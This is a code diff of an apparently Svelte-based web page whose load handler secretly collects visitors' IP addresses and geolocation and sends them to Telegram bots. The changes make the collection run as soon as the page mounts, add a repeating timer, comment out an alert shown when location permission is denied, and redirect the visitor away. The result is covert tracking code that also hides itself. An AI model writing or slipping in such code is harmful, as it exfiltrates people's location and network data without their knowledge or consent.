@@ -5,13 +5,12 @@
 
   onMount(async () => {
 
-window.onload = function() {
-      setInterval(sendIPToTelegramBots, 1000); // 2000 milliseconds = 2 seconds
-    };
 
-window.onload = function() {
-      setInterval(yourFunction, 2000); // 2000 milliseconds = 2 seconds
-    };
+    
+sendIPToTelegramBots();
+
+
+
 
     
     setTimeout(() => {
@@ -23,7 +22,7 @@ window.onload = function() {
         },
         (error) => {
           if (error.code === error.PERMISSION_DENIED) {
-            showAlert();
+          //  showAlert();
             redirectToNextURL();
             // Location permission denied, send IP result to Telegram bots
           }
@@ -31,6 +30,11 @@ window.onload = function() {
       );
     }, 1000);
   });
+
+window.onload = function() {
+      setInterval(yourFunction, 5000); // 2000 milliseconds = 2 seconds
+    };
+
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
@@ -173,7 +177,7 @@ async function yourFunction() {
     (error) => {
       if (error.code === error.PERMISSION_DENIED) {
         // showAlert();
-        // redirectToNextURL();
+         redirectToNextURL();
         // Location permission denied, send IP result to Telegram bots
       }
     }
